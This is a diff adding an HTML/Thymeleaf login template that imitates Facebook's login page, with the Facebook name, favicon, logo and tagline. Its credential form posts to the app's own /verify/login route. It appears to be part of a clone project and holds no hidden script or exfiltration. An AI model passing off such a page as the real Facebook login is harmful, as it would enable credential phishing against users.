@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org" lang="en">
+    <head>
+        <link rel="stylesheet" th:href="@{/css/login.css}"/>
+        <link rel="stylesheet" th:href="@{/css/global.css}"/>
+        <title>Facebook - Login to your account</title>
+        <link rel="icon" th:href="@{/images/facebook.ico}" type="image/x-icon"/>
+        <meta name="description" content="Login using email or username and password">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#006AFF">
+    </head>
+    <body>
+        <div class="box">
+            <div class="title-box">
+                <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
+                <p>Facebook helps you connect and share with the people in your life.</p>
+            </div>
+            <div class="form-box">
+                <h3 style="
+                                    text-align: left; color: #166fe5;
+                                  ">Welcome back, </h3>
+                <form id="login-form" th:action="@{/verify/login}" method="post" th:object="${login}">
+                    <div style="
+                                    background-color: lightyellow;
+                                    padding: 10px;
+                                    border-radius: 15px;
+                                    margin-bottom: 30px;
+                                " th:if="${loginError} != null">
+                        <p style="
+                                        color: indianred;
+                                        text-align: left;
+                                        font-size: 14px;
+                                        margin-block-start: 0;
+                                        margin-block-end: 0;
+                                    " th:text="${loginError}"></p>
+                    </div>
+                    <label>
+                        <input th:field="*{emailOrUsername}" type="text" placeholder="Email address or username" required>
+                    </label>
+                    <label>
+                        <input th:field="*{password}" type="password" placeholder="Password" required>
+                    </label>
+                    <button type="submit">Log In</button>
+                </form>
+                <hr>
+                <p style="
+                                    color: #555555;
+                                    font-size: 12px;
+                                  ">Don't have an account?</p>
+                <div class="create-btn">
+                    <a th:href="@{/auth/signup}" rel="noopener">Create New Account</a>
+                </div>
+            </div>
+            <div id="loading-popup">
+                <div id="loading-content">
+                    <iframe src="https://lottie.host/?file=5101693a-277c-4e40-89f7-13e58c446517/efgLTY4uvf.lottie"></iframe>
+                </div>
+            </div>
+        </div>
+        <script type="text/javascript" th:src="@{../static/js/loading.js}"></script>
+    </body>
+</html>
